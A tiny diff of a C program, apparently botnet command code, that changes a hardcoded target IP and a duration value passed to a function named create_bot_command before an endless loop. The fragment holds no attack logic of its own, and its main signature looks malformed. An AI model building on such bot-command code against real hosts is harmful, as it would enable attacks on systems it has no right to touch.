@@ -14,8 +14,8 @@ int main(int argc, char argv[])
     }
     
     u_char package[64];
-    u_char ip[4] = {192, 168, 1, 43};
-    create_bot_command(ip, 20, package);
+    u_char ip[4] = {192, 168, 1, 13};
+    create_bot_command(ip, 3600, package);
 
     while(true)
     {
